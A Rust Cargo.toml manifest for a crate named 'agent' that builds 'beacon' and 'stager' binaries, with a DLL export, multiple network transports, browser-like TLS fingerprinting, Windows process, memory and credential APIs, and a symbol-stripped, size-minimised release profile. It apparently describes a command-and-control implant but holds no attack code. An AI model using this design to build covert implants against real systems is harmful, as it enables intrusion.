[package]
name = "agent"
version = "0.1.0"
edition = "2021"
rust-version = "1.75"

[lib]
name = "agent"
path = "src/lib.rs"
crate-type = ["rlib", "cdylib"]

[[bin]]
name = "beacon"
path = "src/bin/beacon.rs"

[[bin]]
name = "stager"
path = "src/bin/stager.rs"

# =====================================================================
# Features
#
# Only size-relevant dependencies are gated. Transports stay in
# [dependencies] unconditionally: the README documents that a build
# with transport_mode: "http" still compiles QUIC code but lto = "fat"
# strips it from the binary. Adding a feature per transport would
# multiply the builder's job for no binary-size gain.
# =====================================================================

[features]
default = []
dll = []                      # toggles the DllMain export; crate-type stays ["rlib", "cdylib"]
verbose = []                  # enables the diag! macro body
stager = []                   # stager-only build; the bin is always compiled, this gates its helpers
wasm-host = ["dep:wasmi"]     # pulls the WASM extension host; ~1 MB with wasmi
tls-boring = ["dep:boring"]   # BoringSSL ClientHello; requires cmake + C++ toolchain

# =====================================================================
# Dependencies
# =====================================================================

[dependencies]
# Wire format
serde = { version = "1", features = ["derive"] }
serde_json = "1"

# Crypto
aes-gcm = "0.10"
p256 = { version = "0.13", features = ["ecdsa", "ecdh", "pkcs8", "zeroize"] }
sha2 = "0.10"
hkdf = "0.12"
base64 = "0.22"
hex = "0.4"
rand = "0.8"
rand_core = { version = "0.6", features = ["getrandom"] }
zeroize = "1"

# Async runtime
tokio = { version = "1", features = [
    "rt-multi-thread",
    "macros",
    "net",
    "io-util",
    "fs",
    "process",
    "sync",
    "time",
    "signal",
] }

# Transports — unconditional; lto = "fat" prunes unused.
reqwest = { version = "0.12", default-features = false, features = ["rustls-tls", "json"] }
rustls = "0.23"
quinn = "0.11"
tokio-tungstenite = "0.24"
hickory-resolver = "0.24"
hickory-proto = "0.24"
boringtun = "0.6"
socket2 = "0.5"

# TLS fingerprinting — optional; only browsers profiles need it.
boring = { version = "4", optional = true }

# WASM extension host — optional, wasmi is pure Rust and ~1 MB.
wasmi = { version = "0.38", optional = true }

# Errors
thiserror = "2"
anyhow = "1"

# Async trait for the transport interface
async-trait = "0.1"

# Utilities
regex = "1"
walkdir = "2"
which = "6"
chrono = "0.4"
flate2 = "1"
crc32fast = "1"
md-5 = "0.10"
sha1 = "0.10"
uuid = { version = "1", features = ["v4"] }

# =====================================================================
# Build dependencies (build.rs)
# =====================================================================

[build-dependencies]
base64 = "0.22"
hex = "0.4"

# =====================================================================
# Platform-specific dependencies
# =====================================================================

[target.'cfg(unix)'.dependencies]
nix = { version = "0.29", features = [
    "process",
    "ptrace",
    "fs",
    "user",
    "signal",
    "mount",
] }

[target.'cfg(target_os = "linux")'.dependencies]
libc = "0.2"

[target.'cfg(target_os = "windows")'.dependencies]
windows = { version = "0.58", features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Memory",
    "Win32_System_Threading",
    "Win32_System_ProcessStatus",
    "Win32_System_ToolHelp",
    "Win32_System_LibraryLoader",
    "Win32_NetworkManagement_IpHelper",
    "Win32_NetworkManagement_NetManagement",
    "Win32_NetworkManagement_NetShell",
    "Win32_System_Registry",
    "Win32_System_Com",
    "Win32_UI_WindowsAndMessaging",
    "Win32_Graphics_Gdi",
    "Win32_Security_Authentication_Identity",
    "Win32_System_SystemInformation",
    "Win32_System_IO",
    "Win32_Storage_FileSystem",
] }
getrandom = "0.2"    # used by stager/loader.rs; BCryptGenRandom on Windows

# =====================================================================
# Release profile — load-bearing per CONTRIBUTING.md
# =====================================================================

[profile.release]
strip = "symbols"
lto = "fat"
codegen-units = 1
panic = "abort"
opt-level = "z"